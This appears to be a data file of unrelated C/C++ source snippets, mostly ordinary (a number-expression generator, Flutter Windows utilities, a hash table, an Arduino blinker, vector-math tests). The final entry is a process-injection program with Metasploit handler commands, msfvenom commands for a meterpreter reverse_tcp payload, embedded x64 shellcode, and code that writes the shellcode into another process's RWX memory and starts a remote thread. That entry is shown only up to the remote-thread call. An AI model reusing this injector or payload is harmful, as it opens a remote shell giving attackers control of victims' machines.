{\n                out = Generate114::Visit(a);\n                out2 = Generate114::Visit(num - a);\n                if (out != \"\" && out2 != \"\")\n                {\n                    result = out + \" + \" + out2;\n                    goto NEGATIVE_CHECK;\n                }\n            }\n\n            return \"\";\n        }\n\n        // 2. 10000(1e4) <= num <= 114514\n        else if (num <= 114514)\n        {\n        SECOND_FORM_SOLUTION:\n            // form: a * b + c\n            for (int a = 0; a < (int)sqrt(num) + 1; a++)\n            {\n                if (a == 0)\n                    continue;\n                out = Generate114::Visit(a);\n                out2 = Generate114::Visit((long long)num / a);\n                out3 = Generate114::Visit(num % a);\n                if (out != \"\" && out2 != \"\" && out3 != \"\")\n                {\n                    if ((int)num / a != 1)\n                        result += \"(\" + out + \") * (\" + out2 + \")\";\n                    else\n                        result += out;\n                    if (num % a != 0)\n                        result += \" + \" + out3;\n\n                    goto NEGATIVE_CHECK;\n                }\n            }\n\n            return \"\";\n        }\n\n        // 3. 114514 <= num <= 13113456196\n        else if (num <= 13113456196)\n        {\n        THIRD_FORM_SOLUTION:\n            // form:114514 * a + b * c + d\n            std::string out1 = Generate114::Visit((long long)num / 114514);\n            std::string out2 = Generate114::Visit(114514);\n            result = \"( \" + out1 + \") * (\" + out2 + \") + \";\n            int last = num % 114514;\n            if (0 <= last && last <= 10000)\n                goto FIRST_FORM_SOLUTION;\n            else\n                goto SECOND_FORM_SOLUTION;\n        }\n\n        // 4. num > 13113456196\n        else\n        {\n        FOURTH_FORM_SOLUTION:\n            // form: 114514 ^ a * b + c\n            while (temp < 114514)\n            {\n                temp /= 114514;\n                count++;\n            }\n\n            result = \"(\" + Generate114::Visit(114514) + \") ^ (\" + Generate114::Transform(count, debug) + \") * (\" + Generate114::Transform(num / (long long)powl(114514, count)) + \") + \" + Generate114::Transform(num % (long long)powl(114514, count));\n            goto NEGATIVE_CHECK;\n        }\n\n        NEGATIVE_CHECK:\n            if (flag == 1)\n                result += \"\";\n            return result;\n        }\n    }",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// ====================================================\r\n// Your name: Nathaniel VandenBerg\r\n// Complier:  g++\r\n// File type: htable.cpp implementation file\r\n//=====================================================\r\n\r\n#include \"htable.h\"\r\n#include<fstream>\r\n#include <cassert>\r\n\r\n\r\n/**\r\n * @brief Constructor to create an empty hash table\r\n * @param size The number of buckets in the hash table\r\n */\r\nHashTable::HashTable(int size) {\r\n\t//cout << \">HashTable(int);\";\r\n\ttable_size = size;//default size is 23\r\n\ttable = vector<LinkedList>(table_size);\r\n}\r\n\r\n/**\r\n * @brief Destructor\r\n */\r\nHashTable::~HashTable() {\r\n\tcout << \"\\n\\n>~HashTable();\\n\";\r\n\ttable.clear();//clear out the vector\r\n}\r\n/**\r\n * @brief  Get the hash key of the order\r\n * @return int The hashed index of the order ID\r\n */\r\nint HashTable::hash(int id) {\r\n\t//cout << \">hash();=\"<< id % table_size << \"| \";\r\n\treturn id % table_size;\r\n}\r\n\r\n/**\r\n * @brief Find an order by its ID\r\n * @param id: the order ID\r\n * @param order: the reference to stored found order (if found)\r\n * @return true if found, false otherwise\r\n */\r\nbool HashTable::findOrder(int id, Order& order) {\r\n\tcout << \"\\n>findOrder();\";\r\n\tcout << order;\r\n\tif (numOrders() == 0) {//if table is empty return false\r\n\t\treturn false;\r\n\t}\r\n\telse{\r\n\t\tint hashVal = hash(id);//vector index value\r\n\t\tOrder toFind = order;//copy of object Order\r\n\t\ttoFind.id = id;//update id to new value passed to function\r\n\t\tint pos = table[hashVal].search(toFind);//search the LL at the vector index\r\n\t\tif (pos == -1) {//if not in LL\r\n\t\t\tcout << \"->fail\";\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\telse\r\n\t\t\treturn true;\r\n\t}\r\n}\r\n\r\n/**\r\n * @brief Insert an order into the hash table. The order ID is used as the key.\r\n * A order is inserted only if its ID isn't in the table\r\n * @return true if inserted, false otherwise\r\n */\r\nbool HashTable::insertOrder(const Order& order) {\r\n\t//cout << \">insertOrder()\"; \r\n\tcout << order << endl;\r\n\tint hashVal = hash(order.id);//brief function to find order location in array\r\n\r\n\t//use this when table automatically increases in size based off of loadfactor\r\n\t//!!! warning !!! \r\n\t//this has causes problems when trying to rehash the table to a specific size\r\n\t/*if (loadFactor()) {//check the order count to bucket ratio\r\n\t\tint newSize = findNextPrime();//get next prime value for new table size\r\n\t\trehash(newSize);//if it greater than the loadFactor (.3) it should resize the vector\r\n\t}*/\r\n\r\n\tif (table[hashVal].search(order) == -1) {//If the bucket is empty or the ID is not a duplicate\r\n\t\ttable[hashVal].addRear(order);//add to the rear\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\n/**\r\n * @brief Load orders from a file\r\n * \r\n * @param file_name The name of the file to load\r\n */\r\nvoid HashTable::fillTable(string file_name) {\r\n\t// Open the file to read\r\n\t//cout << \">fillTable();\\n\";\r\n\tifstream fin;\r\n\tfin.open(file_name.c_str());\r\n\tif (!fin) {\r\n\t\tcout << \"Error opening file \" << file_name << endl;\r\n\t\treturn;\r\n\t}\r\n\tOrder order;//object Order created\r\n\twhile (fin >> order) {//while there not at the end of the file copy info to order\r\n\t\t//cout << endl << order;\r\n\t\tinsertOrder(order);//insert into table vector\r\n\t}\r\n\trehash(table_size);//use this when table automatically increases in size based off of loadfactor\r\n\tprintTable();\r\n}\r\n\r\n// \r\n/**\r\n * @brief Remove an order from the hash table. The order ID is used as the key.\r\n *        A order is removed only if its ID is in the table\r\n * \r\n * @param id \r\n * @return true if the order is removed, false otherwise\r\n */ \r\nbool HashTable::removeOrder(int id) {\r\n\tcout << \"\\n>removeOrder();\";//cout << \" id: \" << id << endl;\r\n\tif (numOrders() == 0) {//return false if vectro is empty\r\n\t\treturn false;\r\n\t}\r\n\telse {\r\n\t\tint hashVal = hash(id);//brief function to find order location in array\r\n\t\tOrder delOrder;//Order object must be created to reference in search\r\n\t\tdelOrder.id = id;//update Order X.id to id sent to function\r\n\t\tint pos = table[hashVal].search(delOrder);//search by ID value\r\n\t\tif (pos == -1) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\telse {\r\n\t\t\ttable[hashVal].deleteAt(pos, delOrder);\r\n\t\t\t//delOrder.printOrder();\r\n\t\t\tcout << delOrder;\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n}\r\n\r\n// Display the hash table\r\nvoid HashTable::printTable() {\r\n\tcout << \"\\n\\n>printTable();\\n\";\r\n\r\n\tfor (int i = 0; i < table_size; i++) {\r\n\t\tcout << \"Bucket \" << i << \": \";\r\n\t\ttable[i].displayAll();\r\n\t}\r\n}\r\n\r\n/**\r\n * @brief Get the total number of orders in the hash table\r\n * \r\n * @return int The number of orders in the hash table\r\n */\r\nint HashTable::numOrders() const {\r\n\t//cout << \">numOrders();\";\r\n\tint orderCount = 0;\r\n\tint i = 0;\r\n\tfor (auto j : table) {\r\n\t\torderCount += table[i].length();\r\n\t\ti++;\r\n\t}\r\n\t//cout << \" = \" << orderCount << \"| \";\r\n\treturn orderCount;\r\n}\r\n\r\n// Update the order in the hash table\r\n/**\r\n * @brief Update a order in the hash table. The order ID is used as the key.\r\n * \t\t  A order is updated only if its ID is in the table\r\n * @param order the new order that is used to update the old order \r\n * @return true if the order is",
    "//exp 2)// Define the digital pins for the LEDs\r\nconst int ledPin1 = 2; // Pin for the first LED\r\nconst int ledPin2 = 3; // Pin for the second LED\r\nconst int ledPin3 = 4; // Pin for the third LED\r\n\r\n// Define the time interval for LED blinking (in milliseconds)\r\nconst int blinkInterval = 1000; // Interval for each LED blink\r\n\r\n// Variable to track the last time the LED states changed\r\nunsigned long previousMillis = 0;\r\n\r\nvoid setup() {\r\n  // Initialize the digital pins as outputs\r\n  pinMode(2, OUTPUT);\r\n  pinMode(3, OUTPUT);\r\n  pinMode(4, OUTPUT);\r\n}\r\n\r\nvoid loop() {\r\n  // Get the current time\r\n  unsigned long currentMillis = millis();\r\n\r\n  // Check if it's time to change the LED states\r\n  if (currentMillis - previousMillis >= blinkInterval) {\r\n    // Save the last time the LED states were changed\r\n    previousMillis = currentMillis;\r\n\r\n    // Toggle the state of the first LED\r\n    digitalWrite(2, !digitalRead(ledPin1));\r\n\r\n    // Toggle the state of the second LED\r\n    digitalWrite(3, !digitalRead(ledPin2));\r\n\r\n    // Toggle the state of the third LED\r\n    digitalWrite(4, !digitalRead(ledPin3));\r\n  }\r\n}\r\n",
    "#include <gmock/gmock.h>\n#include <gtest/gtest.h>\n\n#include \"vector_algebra_utils.h\"\n\ntypedef Point_3 Point_3;\ntypedef Vector_3 Vector_3;\n\nTEST(VectorAlgebraUtilities, CanComputeUnitVectorForZeroVector)\n{\n  Vector_3 zeroVector(0.0, 0.0, 0.0);\n  EXPECT_EQ(unitVector(zeroVector), zeroVector);\n}\n\nTEST(VectorAlgebraUtilities, CanComputeUnitVectorForNonZeroVector)\n{\n  Vector_3 vec(1.0, 1.0, 1.0);\n  Vector_3 expectedVec = (1. / std::sqrt(3.0)) * vec;\n  EXPECT_EQ(unitVector(vec), expectedVec);\n}\n\nTEST(VectorAlgebraUtilities, CannotComputeCentroidForEmptySet)\n{\n  std::vector<Point_3> points;\n  EXPECT_EQ(getCentroid(points), Point_3(0, 0, 0));\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCentroidForPointsAtSquareCorners)\n{\n  std::vector<Point_3> points = {Point_3(0, 0, 0), Point_3(1, 0, 0), Point_3(0, 1, 0), Point_3(1, 1, 0)};\n  EXPECT_EQ(getCentroid(points), Point_3(0.5, 0.5, 0.0));\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCentroidForPointsAtCubeCorners)\n{\n  std::vector<Point_3> points = {Point_3(0, 0, 0), Point_3(1, 0, 0), Point_3(0, 1, 0), Point_3(1, 1, 0),\n                                 Point_3(0, 0, 1), Point_3(1, 0, 1), Point_3(0, 1, 1), Point_3(1, 1, 1)};\n  EXPECT_EQ(getCentroid(points), Point_3(0.5, 0.5, 0.5));\n}\n\nTEST(VectorAlgebraUtilities, CannotComputeCosAngleForZeroVectors)\n{\n  Vector_3 t1(0, 0, 0);\n  Vector_3 t2(0, 0, 0);\n  Vector_3 t3(1, 0, 0);\n  EXPECT_EQ(cosAngle(t1, t2), std::nullopt);\n  EXPECT_EQ(cosAngle(t2, t1), std::nullopt);\n  EXPECT_EQ(cosAngle(t1, t3), std::nullopt);\n  EXPECT_EQ(cosAngle(t3, t1), std::nullopt);\n  EXPECT_EQ(cosAngle(t2, t3), std::nullopt);\n  EXPECT_EQ(cosAngle(t3, t2), std::nullopt);\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCosAngleForCloseToZeroVectors)\n{\n  Vector_3 t1(0.001, 0.000, 0.000);\n  Vector_3 t2(0.000, 0.001, 0.000);\n  Vector_3 t3(0.000, 0.002, 0.000);\n  Vector_3 t4(0.001, 0.000, 0.001);\n  Vector_3 t5(-0.001, 0.000, 0.000);\n\n  // t1 and t2 at 90 degrees -- expected outcome 0\n  auto t1t2 = cosAngle(t1, t2);\n  EXPECT_NE(t1t2, std::nullopt);\n  EXPECT_NEAR(*t1t2, 0.0, 1e-12);\n\n  // t2 and t3 at 0 degrees -- expected outcome 1\n  auto t2t3 = cosAngle(t2, t3);\n  EXPECT_NE(t2t3, std::nullopt);\n  EXPECT_NEAR(*t2t3, 1.0, 1e-12);\n\n  // t4 and t1 at 45 degrees -- expected outcome 1/sqrt(2)\n  auto t4t1 = cosAngle(t4, t1);\n  EXPECT_NE(t4t1, std::nullopt);\n  EXPECT_NEAR(*t4t1, 1.0 / std::sqrt(2.0), 1e-12);\n\n  // t1 and t5 at 180 degrees -- expected outcome -1\n  auto t1t5 = cosAngle(t1, t5);\n  EXPECT_NE(t1t5, std::nullopt);\n  EXPECT_NEAR(*t1t5, -1.0, 1e-12);\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCosAngleForClockVectors)\n{\n  double theta = 2 * M_PI / 12;\n  std::vector<Vector_3> hours = {\n      Vector_3(std::sin(0. * theta), std::cos(0. * theta), 0),    // 0\n      Vector_3(std::sin(1. * theta), std::cos(1. * theta), 0),    // 1\n      Vector_3(std::sin(2. * theta), std::cos(2. * theta), 0),    // 2\n      Vector_3(std::sin(3. * theta), std::cos(3. * theta), 0),    // 3\n      Vector_3(std::sin(4. * theta), std::cos(4. * theta), 0),    // 4\n      Vector_3(std::sin(5. * theta), std::cos(5. * theta), 0),    // 5\n      Vector_3(std::sin(6. * theta), std::cos(6. * theta), 0),    // 6\n      Vector_3(std::sin(7. * theta), std::cos(7. * theta), 0),    // 7\n      Vector_3(std::sin(8. * theta), std::cos(8. * theta), 0),    // 8\n      Vector_3(std::sin(9. * theta), std::cos(9. * theta), 0),    // 9\n      Vector_3(std::sin(10. * theta), std::cos(10. * theta), 0),  // 10\n      Vector_3(std::sin(11. * theta), std::cos(11. * theta), 0),  // 11\n      Vector_3(std::sin(12. * theta), std::cos(12. * theta), 0)   // 12\n  };\n\n  Vector_3 h0 = hours[0];\n  for (std::size_t i = 1; i < hours.size() - 1; i++)\n  {\n    auto ca = cosAngle(h0, hours[i]);\n    EXPECT_NE(ca, std::nullopt);\n    EXPECT_NEAR(*ca, std::cos(i * theta), 1.e-12);\n  }\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCosAngleForClockPoints)\n{\n  double theta = 2 * M_PI / 12;\n  std::vector<Vector_3> hours = {\n      Vector_3(std::sin(0. * theta), std::cos(0. * theta), 0),    // 0\n      Vector_3(std::sin(1. * theta), std::cos(1. * theta), 0),    // 1\n      Vector_3(std::sin(2. * theta), std::cos(2. * theta), 0),    // 2\n      Vector_3(std::sin(3. * theta), std::cos(3. * theta), 0),    // 3\n      Vector_3(std::sin(4. * theta), std::cos(4. * theta), 0),    // 4\n      Vector_3(std::sin(5. * theta), std::cos(5. * theta), 0),    // 5\n      Vector_3(std::sin(6. * theta), std::cos(6. * theta), 0),    // 6\n      Vector_3(std::sin(7. * theta), std::cos(7. * theta), 0),    // 7\n      Vector_3(std::sin(8. * theta), std::cos(8. * theta), 0),    // 8\n      Vector_3(std::sin(9. * theta), std::cos(9. * theta), 0),    // 9\n      Vector_3(std::sin(10. * theta), std::cos(10. * theta), 0),  // 10\n      Vector_3(std::sin(11. * theta), std::cos(11. * theta), 0),  // 11\n      Vector_3(std::sin(12. * theta), std::cos(12. * theta), 0)   // 12\n  };\n\n  // make the third points (o, p0, and pi will be passed to cosAngle, where pi is the ith point in the list)\n  Point_3 o(0, 0, 0",
    "// ProcessInjection_01.cpp : This file contains the 'main' function. Program execution begins and ends there.// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY \n// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY \n\n#include <iostream>\n#include <windows.h>\n#include <stdio.h> \nmsf6 exploit(multi/handler) > run -j\n\n[-] Msf::OptionValidateError One or more options failed to validate: LHOST.\n[*] Exploit completed, but no session was created.\nmsf6 exploit(multi/handler) > set lhost wlan1\nlhost => wlan1\nmsf6 exploit(multi/handler) > let lport 443\n[-] Unknown command: let. Did you mean set? Run the help command for more details.\nmsf6 exploit(multi/handler) > set lport 443\nlport => 443\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > run -j\n\n\n\n//* to compile reverse shell, use msfvenom \n//... in the console: msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke\n//  msfvenom --platform windows -a x86 -p payload/windows/custom/reverse_named_pipe LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke003\n/* Init*/\nDWORD PID = NULL;  // process id \nHANDLE hProcess = NULL; // process \nLPVOID rBuffer = NULL; //  data to inject into thread  (buffer)  \nHANDLE hThread = NULL;  // handle thread to write memory \nDWORD TID = NULL; // thread ID\n\n//payload\n//[X64 ARCHITECTURE]\nunsigned char crowPuke[] = \n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\"\n\"\\x8b\\x52\\x20\\x51\\x56\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\"\n\"\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\"\n\"\\x74\\x67\\x48\\x01\\xd0\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\x50\\x8b\"\n\"\\x48\\x18\\xe3\\x56\\x4d\\x31\\xc9\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\"\n\"\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\"\n\"\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\"\n\"\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\"\n\"\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\"\n\"\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\"\n\"\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\"\n\"\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\"\n\"\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\"\n\"\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\x00\\x00\\x00\\x00\\x41\\x54\"\n\"\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\"\n\"\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\"\n\"\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\"\n\"\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\"\n\"\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\"\n\"\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\"\n\"\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\"\n\"\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\"\n\"\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\"\n\"\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\"\n\"\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\"\n\"\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\"\n\"\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\"\n\"\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\"\n\"\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\"\n\"\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\"\n\"\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\"\n\"\\x85\\xf6\\x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\xbb\\xe0\\x1d\"\n\"\\x2a\\x0a\\x41\\x89\\xda\\xff\\xd5\";\n\n\n\nint main(int argc, char* arg[])\n{\n\tif (argc < 2)\n\t{\n\t\tprintf(\"[-] Usage: %s <PID>\\n\", arg[0]);\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tPID = atoi(arg[1]);\n\tprintf(\"[+] PID: \", PID);\n\n\t// Opens handle TO A PROCESS \n\thProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);\n\tif (hProcess == NULL) {\n\t\tprintf(\"[-] Error: Unable to open process %d\\n\");//, PID, GetLastError());\n\t\tprintf(\"Error: \", GetLastError());\n\t\treturn EXIT_FAILURE;\n\t}\n\tprintf(\"[+] Hprocess \" , hProcess);\n\n\t;\n/*\n\t// rBuffer -> ALLOCATE MEMORY SPACE OF THE PAYLOAD, DOES NOT EXECUTE. \n\t// MEM_RESERVE -> RESERVES A RANGE OF THE PERESONS VERITUAL ADDRESS SPACE WITHOUT ACTUALLY ALLOCATING \n\t// MEM_COMMIT -> SETS ASIDE SPACE TO WRITE (DOES NOT WRITE) \n*/ \n\trBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crowPuke), (MEM_COMMIT, MEM_RESERVE), PAGE_EXECUTE_READWRITE); \n\tif (rBuffer == NULL) {\n\t\tprintf(\"[-] Error in rBuffer \"); \n\t\tprintf(\"Error: \", GetLastError());\n\t}\n\n\tprintf(\"[+] rBuffer \", rBuffer, \"with  a permission of \", PAGE_EXECUTE_READWRITE, \"Memory Committed: \", MEM_COMMIT, \"Memory Reserved \", MEM_RESERVE);\n\tprintf(\"allocated size: \", sizeof(crowPuke)); \n\n\n\n\t// Write the allocated memory: insert payload (defined above) into memory \n\tWriteProcessMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), NULL); \n\n\t// Create thread to run payload \n\thThread = CreateRemoteThre",
